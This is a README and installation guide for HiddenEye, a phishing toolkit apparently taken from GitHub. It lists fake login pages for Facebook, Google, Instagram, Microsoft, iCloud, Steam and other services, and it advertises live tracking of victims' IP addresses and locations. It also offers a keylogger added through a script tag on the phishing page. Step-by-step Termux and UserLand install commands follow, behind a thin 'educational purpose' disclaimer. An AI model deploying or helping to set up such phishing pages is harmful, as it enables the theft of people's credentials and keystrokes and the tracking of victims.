# HiddenEye
Phishing Tool!
Use only for educational purpose..
Modern Phishing Tool With Advanced Functionality And Multiple Tunnelling Services [ Android-Support-Available ]

Topics
attack toolkit ngrok keylogger terminal-based termux victim phishing-kit serveo phishing-pages android-users


TESTED ON FOLLOWING:-
Kali Linux - Rolling Edition
Parrot OS - Rolling Edition
Linux Mint - 18.3 Sylvia
Ubuntu - 16.04.3 LTS
MacOS High Sierra
Arch Linux
Manjaro XFCE Edition 17.1.12
Black Arch
TERMUX (For Android Users)
PREREQUISITES ( Please verify if you have installed )
Python 3
Wget from Python
PHP
sudo
WHAT'S NEW FEATURES
1) LIVE ATTACK

Now you will have live information about the victims such as : IP ADDRESS, Geolocation, ISP, Country, & many more.
2) COMPATIBILITY

All the sites are mobile compatible.
3) KEYLOGGER

Now you will also have the ability to capture all the keystokes of victim.
**(CURRENTLY):- This feature is added on instagram web page and github, to less the possibility of slow functioning of generated link)

**HOW TO ADD IT MANUALLY ? -- You can add this manually by putting the codes on index page.(put these code at anywhere inside the index page // but not between any other script codes)

<script src="keylogger.js"></script>

CLONE
git clone https://github.com/DarkSecDevelopers/HiddenEye.git
FOR FURTHER INSTALLATION PROCEDURE - (CHECK INSTRUCTIONS)
AVAILABLE PAGES
+ Facebook:

Traditional Facebook login page.
Advanced Poll Method.
Fake Security login with Facebook Page.
Facebook messenger login page.
+ Google:

Traditional Google login page.
Advanced Poll Method.
+ LinkedIn:

Traditional LinkedIn login page.
+ Github:

Traditional Github login page.
+ Stackoverflow:

Traditional Stackoverflow login page.
+ Wordpress:

Similar Wordpress login page.
+ Twitter:

Traditional Twitter login page.
+ Instagram:

Traditional Instagram login page.
Instagram Autoliker Phishing Page.
Instagram Profile Scenario Advanced attack.
NEW PAGES
1) FACEBOOK PHISHING:

Traditional Facebook login page.
Advanced Poll Method.
Fake Security login with Facebook Page.
Facebook messenger login page.
2) INSTAGRAM PHISHING:

Traditional Login Page
Fake instagram Autoliker Page
Instagram Profile Scenario Advanced attack.
3) SNAPCHAT PHISHING:

Traditional Snapchat Login Page
4) YAHOO PHISHING:

Traditional Yahoo Login Page
5) TWITCH PHISHING:

Traditional Twitch Login Page [ Login With Facebook Also Available ]
6) MICROSOFT PHISHING:

Traditional Microsoft-Live Web Login Page
7) STEAM PHISHING:

Traditional Steam Web Login Page
8) VK PHISHING:

Traditional VK Web Login Page
Advanced Poll Method
9) ICLOUD PHISHING:

Traditional iCloud Web Login Page

INSTRUCTIONS
Skip to content
Search or jump to…

Pull requests
Issues
Marketplace
Explore
 
@meliodas-123 
An0nUD4Y
/
HIDDENEYE-TERMUX-FIXED
16
4237
Code
Issues
6
Pull requests
1
Actions
Projects
Wiki
Security
Insights
HIDDENEYE-TERMUX-FIXED/INSTRUCTIONS.txt
@An0nUD4Y
An0nUD4Y Add files via upload
Latest commit 3030d1c on Aug 30, 2019
 History
 1 contributor
144 lines (82 sloc)  2.78 KB
  
---- HERE ARE THE STEPS TO LAUNCH AND USE HIDDENEYE TOOL.
---- REMEMBER USING THIS TOOL FOR MALICIOUS PURPOSES CAN PUT YOU IN TROUBLE.
---- THIS TOOL IS MADE ONLY FOR EDUCATIONAL PURPOSE.
---- DEVELOPERS OF THIS TOOL WILL NOT BE RESPONSIBLE FOR ANY ILLEGAL USE OF THE TOOL.
---- THIS TOOL IS MADE ONLY TO AWARE THE USERS ABOUT SUCH ATTACKS.


{ CAREFULLY FOLLOW EACH COMMAND ONE BY ONE TO INSTALL THE HIDDENEYE SCRIPT IN YOUR DEVICE }


## FOR ANDROID USERS

### 1) INSTALLING IN (TERMUX APP)

```
First install { Termux } from Playstore.

```

```
After opening Follow below commands One by one

```

```
pkg install git python php curl openssh grep

```

```
pip3 install wget

```

```
git clone -b Termux-Support-Branch https://github.com/DarkSecDevelopers/HiddenEye.git

```

```
cd HiddenEye

```

```
chmod 777 HiddenEye.py

```

```
python HiddenEye.py

OR 

./HiddenEye.py

```

Now script should launched.

================================================================================

[ YOU CAN ALSO COMPLETE ALL THESE STEPS IN JUST ONE COMMAND ]

### ONE LINE COMMAND TO INSTALL IN TERMUX(ANDROID).
After installing termux and opening it.
Just copy/paste below single command and hit Enter .. ALL DONE

'''

pkg install git python php curl openssh grep && pip3 install wget && git clone -b Termux-Support-Branch https://github.com/DarkSecDevelopers/HiddenEye.git && cd HiddenEye && chmod 777 HiddenEye.py && python HiddenEye.py

'''
Press 'y' if asked ..

And after completing process the script should launched now.


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
================================================================================

[ BASICALLY THEIR ARE TWO METHODS TO RUN THE HIDDENEYE IN ANDROID DEVICE ]

A) Installing it in TERMUX APP. (We used above...)
B) Installing it in USERLAND APP. ( Instructions are below )

================================================================================



{ THESE ARE SOME ADDITIONAL INSTRUCTIONS TO INSTALL THE HIDDENEYE TOOL IN ANOTHER APP ON ANDROID }



### 2) INSTALLING IN (USERLAND APP)

```
Install userland app from playstore.

```

```
Set up app and install kali from app.Set ssh username(anyname) and password. 

```

```
When kali will run it'll ask for password type the ssh password.Then do su.After that kali will run on your device without root and do apt update For more info read here, 

(https://null-byte.wonderhowto.com/how-to/android-for-hackers-turn-android-phone-into-hacking-device-without-root-0189649/)

```

```
apt install python3 && python3-pip && unzip && php && git

```

```
git clone https://github.com/DarkSecDevelopers/HiddenEye.git

```

```
cd HiddenEye

```

```
chmod 777 HiddenEye.py

```

```
pip3 install -r requirements.txt

```

```
python3 HiddenEye.py

```

Now script should launched.
© 2021 GitHub, Inc.
Terms
Privacy
Security
Status
Docs
Contact GitHub
Pricing
API
Training
Blog
About




